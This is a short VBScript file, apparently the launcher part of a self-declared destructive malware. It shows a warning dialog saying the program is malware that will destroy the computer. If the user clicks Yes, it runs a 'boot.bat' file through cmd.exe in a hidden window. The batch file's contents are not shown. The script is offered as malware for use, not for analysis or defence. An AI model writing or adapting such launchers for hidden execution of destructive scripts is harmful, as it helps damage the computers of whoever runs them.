Set objShell = CreateObject("WScript.Shell")

' Contenu du disclaimer
disclaimer = "This program is a malware." & vbCrLf & vbCrLf & _
             "This program destruct your computer." & vbCrLf & vbCrLf & _
             "The creator is not responsible of damage" & vbCrLf & _
             "Run ?"

' Afficher le disclaimer avec des boutons "Oui" et "Non"
resultat = MsgBox(disclaimer, vbYesNo + vbQuestion, "WARNING !!!")

' Vérifier la réponse de l'utilisateur
If resultat = vbYes Then
    ' Si l'utilisateur clique sur "Oui", continuez le script ici
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "cmd.exe /c start boot.bat", 0, True
Else
    ' Si l'utilisateur clique sur "Non", le script se termine
    WScript.Quit
End If
